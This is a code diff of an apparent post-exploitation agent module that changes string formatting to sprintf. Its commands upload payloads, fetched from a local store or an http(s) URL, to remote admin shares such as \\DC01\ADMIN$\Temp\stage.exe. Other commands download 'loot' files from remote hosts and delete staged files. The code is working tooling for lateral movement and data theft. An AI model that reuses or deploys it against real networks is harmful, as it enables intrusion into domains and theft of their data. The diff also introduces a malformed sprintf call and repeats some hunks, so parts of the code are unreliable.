@@ -115,7 +115,7 @@ def fmt_winerr(res):
         hint = " (sharing violation — file is locked by another process)"
     elif code == ERROR_DIR_NOT_EMPTY:
         hint = " (directory is not empty)"
-    return "error %d (%s)%s" % (code, msg, hint)
+    return sprintf("error %d (%s)%s", code, msg, hint)
 
 
 # parse_positive_int parses a decimal integer, None on anything else.
@@ -232,8 +232,8 @@ def effective_identity():
     if account == "":
         return sid_str
     if domain == "":
-        return "%s (%s)" % (account, sid_str)
-    return "%s\\%s (%s)" % (domain, account, sid_str)
+        return sprintf("%s (%s)", account, sid_str)
+    return sprintf("%s\\%s (%s)", domain, account, sid_str)
 
 
 # load_payload fetches the bytes to upload. Supports:
@@ -246,7 +246,7 @@ def effective_identity():
 def load_payload(src):
     low = src.lower()
     if low.startswith("http://") or low.startswith("https://"):
-        print("[*] Fetching payload from %s" % src)
+        print(sprintf("[*] Fetching payload from %s", src))
         data = http_get(src)
         if len(data) == 0:
             return None, "http_get returned an empty body (HTTP error or empty file?)"
@@ -254,10 +254,10 @@ def load_payload(src):
     if not exists(src):
         msg = ("source '%s' not found on this agent — stage it first "
                + "(CC: 'put --src <local> --dst memfs:///...' into memfs) or use an http(s):// URL")
-        return None, msg % src
+        return None, sprintf(msg, src)
     data = read_file(src)
     if data == None:
-        return None, "cannot read '%s'" % src
+        return None, sprintf("cannot read '%s'", src)
     return data, ""
 
 
@@ -272,7 +272,7 @@ def ensure_remote_dirs(server, share, dirs):
         if res["r1"] == 0:
             code = int(res.get("err_code", 0))
             if code != ERROR_ALREADY_EXISTS:
-                return False, "CreateDirectoryW %s: %s" % (cur, fmt_winerr(res))
+                return False, sprintf("CreateDirectoryW %s: %s", cur, fmt_winerr(res))
     return True, ""
 
 
@@ -288,7 +288,7 @@ def open_remote(unc_path, access):
                    0, creation, FILE_ATTRIBUTE_NORMAL, 0)
     h = res["r1"]
     if is_invalid_handle(h):
-        return 0, "CreateFileW %s: %s" % (unc_path, fmt_winerr(res))
+        return 0, sprintf("CreateFileW %s: %s", unc_path, fmt_winerr(res))
     return h, ""
 
 
@@ -300,7 +300,7 @@ def remote_size(h):
     size = read_u64(size_ptr, 0)
     win_free(size_ptr)
     if res["r1"] == 0:
-        return 0, "GetFileSizeEx: %s" % fmt_winerr(res)
+        return 0, sprintf("GetFileSizeEx: %s", fmt_winerr(res))
     return size, ""
 
 
@@ -313,7 +313,7 @@ def stream_write(h, data, chunk):
 
     buf = cstring_ptr(data)
     if buf == 0:
-        return 0, "failed to allocate %d-byte payload buffer" % total
+        return 0, sprintf("failed to allocate %d-byte payload buffer", total)
 
     written_ptr = win_alloc(4)
     off = 0
@@ -326,17 +326,17 @@ def stream_write(h, data, chunk):
         if res["r1"] == 0:
             win_free(written_ptr)
             win_free(buf)
-            return off, "WriteFile at offset %d: %s" % (off, fmt_winerr(res))
+            return off, sprintf("WriteFile at offset %d: %s", off, fmt_winerr(res))
         w = read_uint32(written_ptr, 0)
         if w == 0:
             win_free(written_ptr)
             win_free(buf)
-            return off, "WriteFile stalled at offset %d" % off
+            return off, sprintf("WriteFile stalled at offset %d", off)
         off += w
         pct = (off * 100) // total
         if pct // 10 != last_tick:
             last_tick = pct // 10
-            print("[*] Uploaded %d/%d bytes (%d%%)" % (off, total, pct))
+            print(sprintf("[*] Uploaded %d/%d bytes (%d%%)", off, total, pct))
 
     win_free(written_ptr)
     win_free(buf)
@@ -354,9 +354,9 @@ def verify_remote(unc_path, expected):
     win_free(size_ptr)
     win_call("kernel32.dll", "CloseHandle", h)
     if res["r1"] == 0:
-        return False, "GetFileSizeEx %s: %s" % (unc_path, fmt_winerr(res))
+        return False, sprintf("GetFileSizeEx %s: %s", unc_path, fmt_winerr(res))
     if actual != expected:
-        return False, "size mismatch: remote has %d bytes, expected %d" % (actual, expected)
+        return False, sprintf("size mismatch: remote has %d bytes, expected %d", actual, expected)
     return True, ""
 
 
@@ -371,7 +371,7 @@ def open_remote(unc_path, access):
                    0, creation, FILE_ATTRIBUTE_NORMAL, 0)
     h = res["r1"]
     if is_invalid_handle(h):
-        return 0, "CreateFileW %s: %s" % (unc_path, fmt_winerr(res))
+        return 0, sprintf("CreateFileW %s: %s", unc_path, fmt_winerr(res))
     return h, ""
 
 
@@ -382,7 +382,7 @@ def remote_size(h):
     size = read_u64(size_ptr, 0)
     win_free(size_ptr)
     if res["r1"] == 0:
-        return 0, "GetFileSizeEx: %s" % fmt_winerr(res)
+        return 0, sprintf("GetFileSizeEx: %s", fmt_winerr(res))
     return size, ""
 
 
@@ -397,7 +397,7 @@ def stream_read(h, total, chunk):
     # allocation — ReadFile faults (ERROR_NOACCESS 998) past the buffer.
     buf_ptr = win_alloc(chunk)
     if buf_ptr == 0:
-        return None, "failed to allocate %d-byte ReadFile buffer" % chunk
+        return None, sprintf("failed to allocate %d-byte ReadFile buffer", chunk)
     read_ptr = win_alloc(4)
     if read_ptr == 0:
         win_free(buf_ptr)
@@ -414,18 +414,18 @@ def stream_read(h, total, chunk):
         if res["r1"] == 0:
             win_free(read_ptr)
             win_free(buf_ptr)
-            return None, "ReadFile at offset %d: %s" % (got, fmt_winerr(res))
+            return None, sprintf("ReadFile at offset %d: %s", got, fmt_winerr(res))
         r = read_uint32(read_ptr, 0)
         if r == 0:
             win_free(read_ptr)
             win_free(buf_ptr)
-            return None, "ReadFile returned EOF at offset %d (file shrunk? locked?)" % got
+            return None, sprintf("ReadFile returned EOF at offset %d (file shrunk? locked?)", got)
         parts.append(bytes_to_b64(win_read_mem(buf_ptr, r)))
         got += r
         pct = (got * 100) // total
         if pct // 10 != last_tick:
             last_tick = pct // 10
-            print("[*] Downloaded %d/%d bytes (%d%%)" % (got, total, pct))
+            print(sprintf("[*] Downloaded %d/%d bytes (%d%%)", got, total, pct))
 
     win_free(read_ptr)
     win_free(buf_ptr)
@@ -440,11 +440,11 @@ def stream_read(h, total, chunk):
 def save_download(dest, data):
     if not (dest.startswith("memfs://") or str_contains(dest, ":\\") or str_contains(dest, ":/")):
         msg = "dest must be a memfs:/// path or a local path like C:\\loot.zip (not a UNC path)"
-        print("[-] %s" % msg)
+        print(sprintf("[-] %s", msg))
         return 0, msg
     written = write_bytes(dest, data)
     if written != len(data):
-        return written, "short write: wrote %d of %d bytes to %s" % (written, len(data), dest)
+        return written, sprintf("short write: wrote %d of %d bytes to %s", written, len(data), dest)
     return written, ""
 
 
@@ -460,7 +460,7 @@ def verify_download(src, first_data, size, chunk):
     if err != "":
         return "", err
     if crypto_hash("sha256", data) != crypto_hash("sha256", first_data):
-        return "", "re-read of %s does not match the first download (file changed mid-transfer?)" % src
+        return "", sprintf("re-read of %s does not match the first download (file changed mid-transfer?)", src)
     return "", ""
 
 
@@ -477,7 +477,7 @@ def confirm_gone(dest, is_dir):
     code = int(res.get("err_code", 0))
     if code == ERROR_FILE_NOT_FOUND or code == ERROR_PATH_NOT_FOUND:
         return True, ""
-    return True, "cannot re-open to confirm (error %d)" % code
+    return True, sprintf("cannot re-open to confirm (error %d)", code)
 
 
 # ── command: upload ─────────────────────────────────────────────────────────
@@ -496,7 +496,7 @@ def cmd_upload(args):
     chunk_kb = 1024
     kb = parse_positive_int(chunk_kb_raw)
     if kb == None:
-        print("[!] invalid chunk_kb '%s', using 1024" % str(chunk_kb_raw))
+        print(sprintf("[!] invalid chunk_kb '%s', using 1024", str(chunk_kb_raw)))
     else:
         chunk_kb = kb
     if chunk_kb < 1:
@@ -508,10 +508,10 @@ def cmd_upload(args):
         usage()
         return "Fail: dest must be a full UNC path under an existing share, e.g. \\\\DC01\\ADMIN$\\Temp\\stage.exe"
 
-    print("[*] cifs_upload: %s  ->  %s" % (src, dest))
+    print(sprintf("[*] cifs_upload: %s  ->  %s", src, dest))
     who = effective_identity()
     if who != "":
-        print("[*] Effective identity: %s" % who)
+        print(sprintf("[*] Effective identity: %s", who))
     else:
         print("[!] Could not resolve the effective token identity")
 
@@ -519,7 +519,7 @@ def cmd_upload(args):
     if err != "":
         return "Fail: " + err
     total = len(data)
-    print("[*] Payload size: %d bytes" % total)
+    print(sprintf("[*] Payload size: %d bytes", total))
 
     # Make sure the destination folder exists (best effort) before opening.
     ok, err = ensure_remote_dirs(unc["server"], unc["share"], unc["dirs"])
@@ -538,22 +538,22 @@ def cmd_upload(args):
     written, err = stream_write(h, data, chunk)
     win_call("kernel32.dll", "CloseHandle", h)
     if err != "":
-        print("[-] Upload interrupted after %d bytes — partial remote file may remain" % written)
+        print(sprintf("[-] Upload interrupted after %d bytes — partial remote file may remain", written))
         return "Fail: " + err
 
     if do_verify:
         ok, verr = verify_remote(dest, total)
         if not ok:
             return "Fail: upload finished but verify failed: " + verr
-        print("[+] Verified: %d bytes on %s" % (total, dest))
+        print(sprintf("[+] Verified: %d bytes on %s", total, dest))
 
     if delete_src and (src.startswith("memfs://") or src.find("://") == -1):
         if exists(src):
             remove(src)
-            print("[*] Removed source %s" % src)
+            print(sprintf("[*] Removed source %s", src))
 
-    print("[+] Upload complete: %d bytes -> %s" % (total, dest))
-    return "OK: uploaded %d bytes to %s as %s" % (total, dest, who if who != "" else "the assigned token context")
+    print(sprintf("[+] Upload complete: %d bytes -> %s", total, dest))
+    return sprintf("OK: uploaded %d bytes to %s as %s", total, dest, who if who != "" else "the assigned token context")
 
 
 # ── command: download ─────────────────────────────────────────────────────
@@ -571,7 +571,7 @@ def cmd_download(args):
     chunk_kb = 1024
     kb = parse_positive_int(chunk_kb_raw)
     if kb == None:
-        print("[!] invalid chunk_kb '%s', using 1024" % str(chunk_kb_raw))
+        print(sprintf("[!] invalid chunk_kb '%s', using 1024", str(chunk_kb_raw)))
     else:
         chunk_kb = kb
     if chunk_kb < 1:
@@ -588,10 +588,10 @@ def cmd_download(args):
         usage()
         return "Fail: dest must be a memfs:/// path or a local path (e.g. memfs:///loot.zip or C:\\loot.zip) — not another UNC share"
 
-    print("[*] cifs_download: %s  ->  %s" % (src, dest))
+    print(sprintf("[*] cifs_download: %s  ->  %s", src, dest))
     who = effective_identity()
     if who != "":
-        print("[*] Effective identity: %s" % who)
+        print(sprintf("[*] Effective identity: %s", who))
     else:
         print("[!] Could not resolve the effective token identity")
 
@@ -605,8 +605,8 @@ def cmd_download(args):
         return "Fail: " + err
     if size == 0:
         win_call("kernel32.dll", "CloseHandle", h)
-        return "Fail: %s is empty (0 bytes) — wrong path, or the file is locked/zero-length" % src
-    print("[*] Remote file size: %d bytes" % size)
+        return sprintf("Fail: %s is empty (0 bytes) — wrong path, or the file is locked/zero-length", src)
+    print(sprintf("[*] Remote file size: %d bytes", size))
 
     data, err = stream_read(h, size, chunk)
     win_call("kernel32.dll", "CloseHandle", h)
@@ -622,11 +622,10 @@ def cmd_download(args):
         _, verr = verify_download(src, data, size, chunk)
         if verr != "":
             return "Fail: download finished but verify failed: " + verr
-        print("[+] Verified: re-read of %s matches (%d bytes)" % (src, size))
+        print(sprintf("[+] Verified: re-read of %s matches (%d bytes)", src, size))
 
-    print("[+] Download complete: %d bytes -> %s" % (written, dest))
-    return "OK: downloaded %d bytes from %s to %s as %s" % (
-        written, src, dest, who if who != "" else "the assigned token context")
+    print(sprintf("[+] Download complete: %d bytes -> %s", written, dest))
+    return sprintf("OK: downloaded %d bytes from %s to %s as %s", written, src, dest, who if who != "" else "the assigned token context")
 
 
 # ── command: delete ─────────────────────────────────────────────────────────
@@ -645,10 +644,10 @@ def cmd_delete(args):
         return "Fail: dest must be a full UNC path under an existing share, e.g. \\\\DC01\\ADMIN$\\Temp\\stage.exe"
 
     kind = "directory" if rmdir else "file"
-    print("[*] cifs_rm: removing %s %s" % (kind, dest))
+    print(sprintf("[*] cifs_rm: removing %s %s", kind, dest))
     who = effective_identity()
     if who != "":
-        print("[*] Effective identity: %s" % who)
+        print(sprintf("[*] Effective identity: %s", who))
     else:
         print("[!] Could not resolve the effective token identity")
 
@@ -669,16 +668,16 @@ def cmd_delete(args):
                 hint = " (access denied — ACLs, or the target is a file, not a directory?)"
             else:
                 hint = " (access denied — ACLs, or the target is a directory? pass --rmdir true)"
-        return "Fail: %s %s: %s" % (kind, dest, fmt_winerr(res)) + hint
+        return sprintf("Fail: %s %s: %s", (kind, dest, fmt_winerr(res)) + hint)
 
     gone, note = confirm_gone(dest, rmdir)
     if not gone:
-        return "Fail: %s %s: %s" % (kind, dest, note)
+        return sprintf("Fail: %s %s: %s", kind, dest, note)
 
-    print("[+] Removed %s %s" % (kind, dest))
+    print(sprintf("[+] Removed %s %s", kind, dest))
     if note != "":
-        print("[!] %s" % note)
-    return "OK: removed %s %s" % (kind, dest)
+        print(sprintf("[!] %s", note))
+    return sprintf("OK: removed %s %s", kind, dest)
 
 
 def usage():
